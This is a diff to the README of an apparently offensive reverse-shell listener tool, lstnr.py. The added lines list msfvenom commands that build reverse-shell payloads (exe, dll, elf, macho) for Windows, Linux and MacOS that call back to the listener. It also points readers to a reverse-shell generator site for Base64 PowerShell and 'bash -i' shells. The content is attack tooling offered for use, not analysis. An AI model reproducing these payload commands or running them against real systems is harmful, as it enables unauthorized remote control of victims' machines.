@@ -27,6 +27,11 @@ cd lstnr
     - `exit` or `die` : while in a session will terminate it
 
 2. Have CLIENT connect to LSTNR
+    - Best options that work with `lstnr.py`
+        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f exe -o rev.exe`
+        - Windows: `msfvenom -p windows/x64/powershell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f dll -o rev.dll`
+        - Linux: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f elf -o rev.elf`
+        - MacOS: `msfvenom -p osx/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=21 -f macho -o rev.macho`
     - You can use any of the methods found on https://www.revshells.com
         - Windows: `Powershell #3 (Base64)`
         - Linux: `Bash -i`
